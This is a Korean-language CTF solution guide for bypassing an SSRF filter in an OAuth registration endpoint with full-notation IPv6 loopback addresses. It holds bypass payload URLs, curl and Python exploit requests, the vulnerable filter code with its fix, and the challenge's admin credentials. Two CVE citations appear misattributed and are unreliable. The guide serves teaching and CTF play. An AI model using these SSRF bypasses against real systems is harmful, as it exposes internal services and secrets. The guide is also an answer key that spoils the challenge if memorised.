# SSRF 필터 우회 가이드 (IPv6 Bypass)

## 🔒 적용된 SSRF 필터링

### 차단되는 형식들

```
❌ http://localhost:8000/internal/admin/dev-config.json
❌ http://127.0.0.1:8000/internal/admin/dev-config.json
❌ http://127.1:8000/internal/admin/dev-config.json
❌ http://0177.0.0.1:8000/internal/admin/dev-config.json (8진수)
❌ http://0x7f000001:8000/internal/admin/dev-config.json (16진수)
❌ http://2130706433:8000/internal/admin/dev-config.json (10진수)
❌ http://[::1]:8000/internal/admin/dev-config.json (IPv6 축약형)
❌ http://[::ffff:127.0.0.1]:8000/internal/admin/dev-config.json (IPv4-mapped)
❌ http://auth-server:8000/internal/admin/dev-config.json (내부 호스트명)
❌ http://192.168.x.x:8000/... (사설망)
```

### ✅ 우회 가능한 형식 (Intended Solution)

```
✅ http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json
✅ http://[0000:0000:0000:0000:0000:0000:0000:0001]:8000/internal/admin/dev-config.json
✅ http://[0:0:0:0:0:0:0:01]:8000/internal/admin/dev-config.json
```

## 🎯 취약점 분석

### 필터의 로직 흐름

```python
def is_ssrf_blocked(url):
    # Step 1: 문자열 기반 체크
    if hostname_lower in ['localhost', '127.0.0.1', '[::1]', ...]:
        return True  # ✅ 축약형은 차단됨

    # Step 2: IPv4 사설망 체크
    if hostname_lower.startswith('192.168.'):
        return True

    # Step 3: IP 주소 파싱
    ip = ipaddress.ip_address(clean_hostname)

    if isinstance(ip, ipaddress.IPv4Address):
        if ip.is_loopback:  # 127.0.0.1 체크
            return True

    elif isinstance(ip, ipaddress.IPv6Address):
        # 🔥 여기가 취약점!
        if '::1' in hostname_lower:  # 축약형만 체크
            return True
        # ip.is_loopback 체크를 하지 않음!
        # → full notation은 통과!
```

### 왜 우회가 가능한가?

1. **문자열 체크 우회**: `[0:0:0:0:0:0:0:1]` ≠ `[::1]` (리스트에 없음)
2. **패턴 매칭 우회**: `'::1'`이 문자열에 포함되지 않음
3. **is_loopback 누락**: IPv6Address에 대한 loopback 검증을 하지 않음

## 🛠️ 테스트 방법

### 1. 차단 확인

```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Test",
    "redirect_uris": ["http://localhost:8080/callback"],
    "logo_uri": "http://[::1]:8000/internal/admin/dev-config.json"
  }'

# 예상 응답: 403 Forbidden (ssrf_blocked)
```

### 2. 우회 성공 확인

```bash
curl -X POST http://localhost:8080/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Test",
    "redirect_uris": ["http://localhost:8080/callback"],
    "logo_uri": "http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json"
  }'

# 예상 응답: 200 OK + logo_fetch_result에 내부 설정 파일 내용
```

### 3. Python으로 테스트

```python
import requests

BASE_URL = "http://localhost:8080"

# 우회 시도
register_data = {
    "client_name": "Attacker Client",
    "redirect_uris": [f"{BASE_URL}/auth/callback"],
    "logo_uri": "http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json"
}

response = requests.post(f"{BASE_URL}/oauth/register", json=register_data)
result = response.json()

print(result.get('logo_fetch_result', {}).get('content'))
```

## 📚 학습 포인트

### 1. IPv6 주소 표기법

- **축약형 (Compressed)**: `::1`
- **전체 표기 (Full)**: `0:0:0:0:0:0:0:1`
- **혼합형**: `0:0:0:0:0:0:0:01`

### 2. SSRF 방어 우회 기법

- URL 인코딩
- 진법 변환 (8진수, 16진수)
- DNS Rebinding
- IPv6 변형
- 리다이렉트 체인

### 3. 올바른 SSRF 방어

```python
# 수정된 안전한 버전
elif isinstance(ip, ipaddress.IPv6Address):
    if ip.is_loopback or ip.is_private:  # 🔥 is_loopback 체크 추가!
        return True
```

## 🎓 CTF 난이도

**Medium**: IPv6 지식이 필요하지만, 힌트를 통해 충분히 해결 가능

### 힌트 단계

1. "localhost와 127.0.0.1이 차단되네요... 다른 방법이 있을까요?"
2. "IPv4 말고 IPv6도 있다는데..."
3. "[::1]도 차단되네요. IPv6의 다른 표기법은?"
4. "IPv6 전체 표기: 0:0:0:0:0:0:0:1"

## 🔍 관련 CVE 사례

- **CVE-2017-9765**: Gogs SSRF via IPv6
- **CVE-2019-9636**: Python urllib IPv6 parsing bypass
- 많은 SSRF 필터들이 IPv6를 제대로 검증하지 않음

## 🎯 플래그 획득 경로

```
1. IPv6 Full Notation SSRF
   ↓
2. /internal/admin/dev-config.json 접근
   ↓
3. Admin 계정 추출: MSG_CTF_HACKER / Wh3r3_is_SSRF?!
   ↓
4. Trusted Client ID 추출: msg_developer_portal
   ↓
5. 이후 OAuth 취약점 체인 진행...
   ↓
6. FLAG 획득!
```

---

**문제 출제**: MJSEC(명지대)_이종윤
**난이도**: Medium (IPv6 SSRF Bypass)
**카테고리**: Web Security, SSRF, OAuth 2.0
